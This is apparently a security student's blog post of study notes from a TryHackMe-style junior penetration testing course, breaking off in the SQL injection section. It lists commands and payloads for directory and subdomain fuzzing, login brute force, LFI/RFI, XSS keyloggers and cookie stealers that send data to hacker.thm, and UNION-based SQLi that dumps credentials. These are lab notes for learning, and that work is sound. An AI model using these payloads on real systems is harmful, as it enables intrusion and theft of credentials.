<!DOCTYPE html>













<html lang="en"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Jr Penetrarion Test" />
<meta name="author" content="Yuchao" />
<meta property="og:locale" content="en" />
<meta name="description" content="Content Discovery Wappalyzer (https://www.wappalyzer.com/) The Wayback Machine (https://archive.org/web/) Automated Discovery https://github.com/danielmiessler/SecLists ffuf, “Fuzz Faster you Fool” user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ dirb user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt gobuster user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt" />
<meta property="og:description" content="Content Discovery Wappalyzer (https://www.wappalyzer.com/) The Wayback Machine (https://archive.org/web/) Automated Discovery https://github.com/danielmiessler/SecLists ffuf, “Fuzz Faster you Fool” user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ dirb user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt gobuster user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt" />
<link rel="canonical" href="/posts/Jr-Penetration-Tester/" />
<meta property="og:url" content="/posts/Jr-Penetration-Tester/" />
<meta property="og:site_name" content="Yuchao Toolbox" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-01-28T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Jr Penetrarion Test" />
<meta name="twitter:site" content="@0xZEN2" />
<meta name="twitter:creator" content="@Yuchao" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-01-28T00:00:00+08:00","datePublished":"2022-01-28T00:00:00+08:00","description":"Content Discovery Wappalyzer (https://www.wappalyzer.com/) The Wayback Machine (https://archive.org/web/) Automated Discovery https://github.com/danielmiessler/SecLists ffuf, “Fuzz Faster you Fool” user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ dirb user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt gobuster user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt","headline":"Jr Penetrarion Test","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Jr-Penetration-Tester/"},"url":"/posts/Jr-Penetration-Tester/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Jr Penetrarion Test | Yuchao Toolbox
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Yuchao Toolbox">
<meta name="application-name" content="Yuchao Toolbox">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
          
          <img src="https://raw.githubusercontent.com/YuchaoZheng88/blogImage/main/123.png" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Yuchao Toolbox</a>
    </div>
    <div class="site-subtitle font-italic">About hacking and thinking.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/YuchaoZheng88" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/0xZEN2" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['johneastcodestock','gmail.com'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Jr Penetrarion Test</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->







<h1 data-toc-skip>Jr Penetrarion Test</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>
    
    

    

    By
    <em>
      
        Yuchao
      
    </em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago"
    data-ts="1643299200"
    
      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
    
    >
  2022-01-28
</em>

      </span>

      <!-- lastmod date -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="5910 words">
  <em>32 min</em> read</span>


      <!-- page views -->
      
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <h2 id="content-discovery"><span class="mr-2">Content Discovery</span><a href="#content-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>Wappalyzer (https://www.wappalyzer.com/)</li>
  <li>The Wayback Machine (https://archive.org/web/)</li>
  <li>Automated Discovery https://github.com/danielmiessler/SecLists</li>
  <li>ffuf,  “Fuzz Faster you Fool”</li>
  <li><code class="language-plaintext highlighter-rouge">user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ</code></li>
  <li>dirb</li>
  <li><code class="language-plaintext highlighter-rouge">user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</code></li>
  <li>gobuster</li>
  <li><code class="language-plaintext highlighter-rouge">user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</code></li>
</ul>

<h2 id="subdomain-enumeration"><span class="mr-2">Subdomain Enumeration</span><a href="#subdomain-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ol>
  <li>Certificate Transparency (CT) logs
    <ul>
      <li>SSL/TLS Certificates. (https://crt.sh ; https://transparencyreport.google.com/https/certificates)</li>
    </ul>
  </li>
  <li>google search <code class="language-plaintext highlighter-rouge">-site:www.tryhackme.com  site:*.tryhackme.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">dnsrecon -t brt -d acmeitsupport.thm</code></li>
  <li><code class="language-plaintext highlighter-rouge">./sublist3r.py -d acmeitsupport.thm</code></li>
  <li>private DNS server. “/etc/hosts” file (or c:\windows\system32\drivers\etc\hosts file for Windows users)</li>
  <li><code class="language-plaintext highlighter-rouge">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130</code></li>
  <li><code class="language-plaintext highlighter-rouge">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 -fs {size}</code> -fs switch, which tells ffuf to ignore any results that are of the specified size.</li>
</ol>

<h2 id="authentication-bypass"><span class="mr-2">Authentication Bypass</span><a href="#authentication-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>fuzz posibble exist usernames.</strong></p>
<ul>
  <li>https://github.com/ffuf/ffuf</li>
  <li><code class="language-plaintext highlighter-rouge">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.94.177/customers/signup -mr "username already exists"</code></li>
  <li>-X argument specifies the request method.</li>
  <li>-d argument specifies the data that we are going to send.</li>
  <li>-H argument is used for adding additional headers to the request. setting the “Content-Type” to the webserver knows we are sending form data.</li>
  <li>-u argument specifies the URL we are making the request to.</li>
  <li>-mr argument is the text on the page we are looking for to validate we’ve found a valid username.</li>
</ul>

<p><strong>brute force</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&amp;password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.2.151/customers/login -fc 200</code></li>
  <li>-fc argument to check for an HTTP status code other than 200.</li>
</ul>

<p><strong>logic flaw</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&amp;email={username}@customer.acmeitsupport.thm'</code></li>
  <li>the server send email to the address client posts</li>
</ul>

<p><strong>cookie tempering</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">curl -H "Cookie: logged_in=true; admin=true" http://10.10.2.151/cookie-test</code></li>
  <li>Hash crack website. https://crackstation.net/</li>
</ul>

<h2 id="idor"><span class="mr-2">IDOR</span><a href="#idor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>Insecure Direct Object Reference</li>
</ul>

<p><strong>find IDOR in Encode IDs</strong></p>
<ul>
  <li>https://www.base64decode.org/; https://www.base64encode.org/</li>
</ul>

<p><strong>find IDOR in Hashed IDs</strong></p>
<ul>
  <li>https://crackstation.net/</li>
</ul>

<h2 id="file-inclusion"><span class="mr-2">File Inclusion</span><a href="#file-inclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>common OS files:</strong></p>
<ul>
  <li>/etc/issue, /etc/profile, /proc/version, /etc/passwd,</li>
  <li>/etc/shadow, /root/.bash_history, /var/log/dmessage,</li>
  <li>/var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log</li>
  <li>C:\boot.ini</li>
</ul>

<p><strong>Php include function:</strong></p>
<ul>
  <li>https://www.php.net/manual/en/function.include.php</li>
</ul>

<p><strong>file-get-contents.php:</strong></p>
<ul>
  <li>https://www.php.net/manual/en/function.file-get-contents.php</li>
  <li>user’s input is passed to a function such as file_get_contents in PHP.</li>
  <li>It’s important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.
    <div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nb">file_get_contents</span><span class="p">(</span>
 <span class="n">string</span> <span class="nv">$filename</span><span class="p">,</span>
 <span class="n">bool</span> <span class="nv">$use_include_path</span> <span class="o">=</span> <span class="kc">false</span><span class="p">,</span>
 <span class="n">resource</span> <span class="nv">$context</span> <span class="o">=</span> <span class="o">?</span><span class="p">,</span>
 <span class="n">int</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
 <span class="n">int</span> <span class="nv">$length</span> <span class="o">=</span> <span class="o">?</span>
<span class="p">)</span><span class="o">:</span> <span class="n">string</span><span class="o">|</span><span class="kc">false</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<p><strong>Local File Inclusion (LFI)</strong></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?PHP</span> 
	<span class="k">include</span><span class="p">(</span><span class="s2">"languages/"</span><span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">]);</span> 
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12. Auto add “.php”.</p>
<ul>
  <li>Conquer: <code class="language-plaintext highlighter-rouge">include("languages/../../../../../etc/passwd%00").".php");</code> %00 or 0x00</li>
  <li>NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.</li>
</ul>

<p><strong>Remote File Inclusion - RFI</strong></p>
<ul>
  <li>One requirement for RFI is that the <code class="language-plaintext highlighter-rouge">allow_url_fopen</code> option needs to be on.</li>
  <li><code class="language-plaintext highlighter-rouge">allow_url_include</code></li>
  <li>https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen</li>
  <li>lead server to execute code from attacker`s server.</li>
  <li>start attack server: <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server</code></li>
  <li>prepare payload: cmd.txt: <code class="language-plaintext highlighter-rouge">&lt;?php print exec('hostname');?&gt;</code></li>
  <li>lead victim server to execute it: http://webapp.htm/get.php?file=http://attacker.thm/cmd.txt</li>
</ul>

<h2 id="ssrf"><span class="mr-2">SSRF</span><a href="#ssrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>server side request forgery</li>
  <li>2 types: regular, blind.</li>
  <li><img data-src="https://user-images.githubusercontent.com/91292763/147397891-1b4af01a-9f39-4b36-bd33-05bc21b2313e.png" alt="image" data-proofer-ignore></li>
  <li>requestbin.com</li>
</ul>

<h2 id="xss"><span class="mr-2">XSS</span><a href="#xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>cross-site scripting</li>
  <li>Key Logger js: <code class="language-plaintext highlighter-rouge">document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</code></li>
  <li>Session Stealing js: <code class="language-plaintext highlighter-rouge">fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</code></li>
</ul>

<p><strong>DOM Based XSS</strong></p>
<ul>
  <li>DOM: https://www.w3.org/TR/REC-DOM-Level-1/introduction.html</li>
  <li><code class="language-plaintext highlighter-rouge">window.location.hash</code> parameter.</li>
  <li>js: eval() function is very vulnerable.</li>
</ul>

<p><strong>Blind Xss</strong></p>
<ul>
  <li>https://xsshunter.com/</li>
  <li><code class="language-plaintext highlighter-rouge">/images/cat.jpg" onload="alert('HTM');</code> When upload an image, but server filter ‘&lt;’ and ‘&gt;’, we can use onload function.</li>
</ul>

<p><strong>Polyglots</strong>:</p>
<ul>
  <li>Can help you bypass all filters.</li>
  <li><code class="language-plaintext highlighter-rouge">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</code></li>
  <li>https://blog.ostorlab.co/polyglot-xss.html</li>
</ul>

<p>Get cookie from xss:</p>
<ul>
  <li>net cat: <code class="language-plaintext highlighter-rouge">nc -nlvp 9001</code> start server.</li>
  <li><code class="language-plaintext highlighter-rouge">fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) );</code></li>
  <li>wait for the victim.</li>
</ul>

<h2 id="command-injection"><span class="mr-2">Command Injection</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>also often known as “Remote Code Execution” (RCE)</li>
  <li>https://owasp.org/www-project-top-ten/</li>
  <li>https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report</li>
  <li>php vulnerable functions: <code class="language-plaintext highlighter-rouge">Exec</code>, <code class="language-plaintext highlighter-rouge">Passthru</code>, <code class="language-plaintext highlighter-rouge">System</code></li>
  <li>php: <code class="language-plaintext highlighter-rouge">filter_input</code> https://www.php.net/manual/en/function.filter-input.php</li>
  <li>use hexadecimal value to bypass the filter.</li>
  <li>cheat sheet for more payloads: https://github.com/payloadbox/command-injection-payload-list</li>
</ul>

<h2 id="sql-injection"><span class="mr-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>Structured Query Language</li>
  <li><code class="language-plaintext highlighter-rouge">select * from users where username like 'a%';</code> returns any rows with username beginning with the letter a.</li>
  <li><code class="language-plaintext highlighter-rouge">select * from users where username like '%n';</code>  ending with the letter n.</li>
  <li><code class="language-plaintext highlighter-rouge">select * from users where username like '%mi%';</code> characters mi within them.</li>
</ul>

<p>Union</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;</code></li>
</ul>

<p>Insert</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">insert into users (username,password) values ('bob','password123');</code></li>
</ul>

<p>Update</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">update users SET username='root',password='pass123' where username='admin';</code></li>
</ul>

<p>Delete</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">delete from users where username='martin';</code></li>
</ul>

<p>In-Band SQL Injection</p>
<ul>
  <li>select * from article where id = <code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,database()</code></li>
  <li>get database name</li>
  <li>select * from article where id = <code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'</code></li>
  <li>get table names in the database “sqli_one”</li>
  <li>select * from article where id = <code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</code></li>
  <li>get column names in the table “staff_users”</li>
  <li>select * from article where id = <code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users</code></li>
</ul>

<p>Blind SQLi (Boolean Based)</p>
<ul>
  <li>select * from users where username = ‘<code class="language-plaintext highlighter-rouge">A' UNION SELECT 1,2,3 WHERE database() like 's%';--</code>’ LIMIT 1</li>
  <li>we can try every possible combination to find the database`s name.</li>
</ul>

<p>Blind SQLi (Time base)
The table has 2 columns.</p>
<ul>
